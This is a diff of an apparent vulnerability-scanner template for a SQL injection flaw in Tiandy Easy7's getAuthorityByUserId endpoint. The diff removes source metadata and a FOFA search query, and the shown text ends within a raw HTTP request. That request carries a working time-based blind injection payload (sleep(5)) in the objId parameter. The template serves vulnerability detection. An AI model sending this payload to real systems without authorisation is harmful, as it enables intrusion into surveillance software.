@@ -3,14 +3,8 @@ info:
   name: 天地伟业Easy7 getAuthorityByUserId 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mpu5gd6g7ih5dgn1
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mpu5gd6g7ih5dgn1
-    fofa: app="Tiandy-Easy7"
 http:
 - raw:
   - 'GET /Easy7/rest/user/getAuthorityByUserId?userId=&objId=a''and(select*from(select+sleep(5))a+union+select+1)=''&authTypes.authTypes=1 HTTP/1.1
